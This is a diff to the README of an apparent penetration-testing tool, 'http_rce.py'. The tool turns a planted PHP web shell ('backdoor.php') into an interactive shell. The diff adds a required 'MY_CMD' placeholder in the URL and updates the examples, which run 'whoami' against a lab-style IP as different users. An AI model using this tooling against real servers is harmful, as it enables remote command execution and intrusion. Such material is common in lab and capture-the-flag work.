@@ -17,11 +17,13 @@ $ python3 ./http_rce.py --url '<URL>' --http-method GET --user '<USER>' --pass '
 $ python3 ./http_rce.py --url '<URL>' --http-method GET --user '<USER>' --pass '<PASS>' --regex-pattern 'Password: (.*), plz dont share it'
 ```
 
+The command's placeholder in the URL MUST be `MY_CMD`.
+
 ## Examples
 
 Running as default user (e.g. `www-data`):
 ```bash
-$ python3 ./http_rce.py --url 'http://10.10.10.123/backdoor.php?c=' --http-method GET
+$ python3 ./http_rce.py --url 'http://10.10.10.123/backdoor.php?c=MY_CMD' --http-method GET
 bash > whoami
 www-data
 
@@ -36,7 +38,7 @@ bash >
 
 Running as another user (e.g. `foo`):
 ```bash
-$ python3 ./http_rce.py --url 'http://10.10.10.123/backdoor.php?foo1=bar2&cmd=' --http-method GET --user 'foo' --pass 'bar123'
+$ python3 ./http_rce.py --url 'http://10.10.10.123/backdoor.php?cmd=MY_CMD&foo1=bar2' --http-method GET --user 'foo' --pass 'bar123'
 bash > whoami
 foo
 
